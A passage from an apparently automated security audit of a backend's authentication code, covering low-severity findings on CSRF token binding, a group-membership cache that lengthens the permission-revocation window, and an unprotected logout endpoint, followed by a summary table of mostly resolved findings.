tied to the authenticated session, nor rotated at login/logout. Plain
double-submit is acceptable here given `SameSite=Strict` and the CORS
allow-list, but binding the token to the session (e.g., HMAC of the user ID) or
rotating it on login would close the residual cookie-forcing class of attacks.

---

### SP-9 🔵 — Group-Membership Cache Extends the Permission-Revocation Window (Accepted Tradeoff)
**File:** `backend/src/controllers/auth.controller.ts` (lines 450–492)

With the ARCH-3 cache, a user removed from an Entra group retains the derived
role/permissions for up to `GROUP_MEMBERSHIP_CACHE_TTL_MS` (30 min) plus the
access-token lifetime. This is a reasonable tradeoff and `isActive` is still
checked on every refresh — documenting it here so the window is a known,
deliberate quantity. Consider clearing `groupsLastSyncedAt` from the admin user
screen as a manual "force re-sync" for urgent revocations.

---

### SP-10 🔵 — `POST /api/auth/logout` Has No CSRF Protection
**Files:** `backend/src/routes/auth.routes.ts`, `backend/src/controllers/auth.controller.ts` (line 607)

Logout is a state-changing POST with no `validateCsrfToken`. Impact is limited
to forced logout (nuisance), and `SameSite=Lax` on the access cookie already
blocks cross-site POSTs in modern browsers — but adding the guard is one line
and makes the mutation surface uniform.

---

## Second-Pass Summary

| Severity | Count | IDs |
|---|---|---|
| 🔴 Critical | 0 | — |
| 🟠 High | 1 | ~~SP-1~~ ✅ |
| 🟡 Medium | 3 | ~~SP-2~~ ✅, ~~SP-3~~ ✅, ~~SP-4~~ ✅ |
| 🔵 Low / Info | 5 | ~~SP-6~~ ✅, ~~SP-7~~ ✅, ~~SP-8~~ ✅, SP-9, SP-10 |
| ⚪ Quality | 1 | ~~SP-5~~ ✅ |
| **Total** | **10** | |

---

*Generated by automated static analysis. Findings should be validated by a developer with full runtime context before implementing fixes.*
